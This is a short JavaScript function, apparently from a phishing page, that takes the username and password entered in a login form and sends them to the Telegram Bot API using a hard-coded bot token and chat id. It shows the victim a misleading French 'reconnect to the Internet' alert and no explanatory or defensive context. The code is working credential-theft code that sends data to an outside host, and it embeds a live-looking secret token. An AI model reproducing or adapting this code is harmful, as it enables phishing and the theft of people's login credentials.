function sendMessage() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const botToken = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
    const chatId = '5687419212';
    const message = `Nouvel utilisateur:\nnom d'utilisateur: ${username}\nmot de passe: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                alert('Vous devez vous reconnecter à Internet');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Vous devez vous reconnecter à Internet');
        });
}
